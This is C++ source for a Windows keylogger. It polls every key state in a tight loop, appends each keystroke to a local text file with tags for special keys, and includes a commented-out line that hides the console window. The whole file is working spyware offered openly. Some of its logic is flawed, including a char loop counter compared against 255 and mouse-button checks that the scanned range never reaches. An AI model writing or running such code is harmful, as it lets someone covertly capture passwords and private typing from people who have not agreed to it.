#include <iostream>
#include <Windows.h>
#include <string.h>
#include <fstream>
using namespace std;

ofstream myFile;

//disable warning
#pragma warning (disable : 4996)

//saving a new character in a file, default: project folder
int Save(int _key, char *file);

//checks if shift is pressed
bool isShift();

int main() {

	//increase value == more precision and less mistakes while getting input characters, but higher CPU usage and slower PC
	//decrease value == just opposite
	int checkKeyboardEveryNMiliseconds = 10;

	//result file location, you can change this if needed
	char* textFilePath = "text.txt";

	//hiding console window
	auto myConsole = GetConsoleWindow();
	//ShowWindow(myConsole, 0);
	
	myFile.open("text.txt", fstream::app);

	char i;
	while (true)
	{
		Sleep(checkKeyboardEveryNMiliseconds);
		for (i = 8; i <= 255; i++)
		{
			//if button is pressed
			if (GetAsyncKeyState(i) == -32767) {
				Save(i, textFilePath);
			}
		}
	}
	return 0;
}

bool isShift() {
	if ((GetKeyState(VK_SHIFT) & 0x8000) != 0)
		return true;
	else
		return false;
}

int Save(int _key, char *file) {
	cout << _key << endl;
	Sleep(10);

	//adding special characters
	//you can add new characters if needed
	if (_key == VK_CAPITAL) {
		myFile << "[CAPITAL]";
	}
	 if (_key == VK_SHIFT)
	{
		 myFile << "[SHIFT]";
	}
	else if (_key == VK_BACK)
	{
		myFile << "[BACKSPACE]";
	}
	else if (_key == VK_LBUTTON)
	{
		myFile << "[MOUSE_LEFT_BUTTON]";
	}
	else if (_key == VK_RBUTTON)
	{
		myFile << "[MOUSE_RIGHT_BUTTON]";
	}
	else if (_key == VK_RETURN)
	{
		myFile << "[ENTER]";
	}
	else if (_key == VK_ESCAPE)
	{
		myFile << "[ESCAPE]";
	}
	else {
		if (isShift())
			myFile << char(_key);
		else {
			char c = tolower(_key);
			myFile << c;
		}
	}
	
	return 0;
}